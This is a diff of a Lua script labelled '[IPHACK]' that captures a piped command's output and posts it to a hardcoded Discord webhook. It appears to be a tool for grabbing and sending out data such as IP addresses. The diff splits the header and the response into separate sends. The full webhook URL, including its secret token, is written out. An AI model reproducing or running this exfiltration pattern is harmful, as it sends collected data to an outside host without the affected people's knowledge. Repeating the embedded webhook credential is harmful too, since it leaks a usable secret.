@@ -1,7 +1,7 @@
 #!/bin/env lua
 
 local token = "https://discord.com/api/webhooks/1549581017231265792/vXUqWMixqjjuDZZxEk8cWS238yXwQTJ6ZdCxAYz7NRgMGsGx-q4ULGuiWELzwV7cx0vX"
-local header = "> # [IPHACK]: \n > "
+local header = "> # [IPHACK]: \\n > "
 local localheader = "\27[96m[proccess]: \27[0m"
 local infoheader = "\27[96m[process]: \27[92m"
 local resetheader = "\27[0m"
@@ -34,7 +34,8 @@ function main(args)
         
         print(localheader.."response:\n"..response)
         print(infoheader.."sending..."..resetheader)
-        send(token, header.."response: \n"..response)
+        send(token, header.."response:")
+        send(token, response)
         print(infoheader.."sent."..resetheader)
     else
         print(errorheader.."cannot open pipe")
